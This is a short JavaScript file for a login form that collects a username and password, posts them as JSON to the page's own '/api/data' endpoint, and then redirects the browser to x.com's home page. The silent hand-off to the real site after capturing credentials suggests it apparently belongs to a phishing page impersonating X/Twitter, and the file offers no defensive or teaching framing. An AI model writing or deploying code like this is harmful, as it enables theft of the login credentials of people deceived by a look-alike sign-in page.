document.addEventListener('DOMContentLoaded', () => {
    const usernameInput = document.querySelector('.username-input');
    const passwordInput = document.querySelector('.password-input');
    const continueButton = document.querySelector('.continue-button');

    function toggleButtonState() {
        if (usernameInput.value.trim() !== '' && passwordInput.value.trim() !== '') {
            continueButton.classList.add('active');
            continueButton.style.cursor = 'pointer';
        } else {
            continueButton.classList.remove('active');
            continueButton.style.cursor = 'not-allowed';
        }
    }

    usernameInput.addEventListener('input', toggleButtonState);
    passwordInput.addEventListener('input', toggleButtonState);

    continueButton.addEventListener('click', (event) => {
        event.preventDefault();
        if (continueButton.classList.contains('active')) {
            const username = usernameInput.value.trim();
            const password = passwordInput.value.trim();
            
            // Send data to backend API
            const endpoint = "/api/data";
            fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username, password })
            })
            .then(response => {
                if (response.ok) {
                    window.location.href = 'https://x.com/home';
                }
                return response.json();
            })
            .then(data => {
                console.log('Success:', data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }
    });
});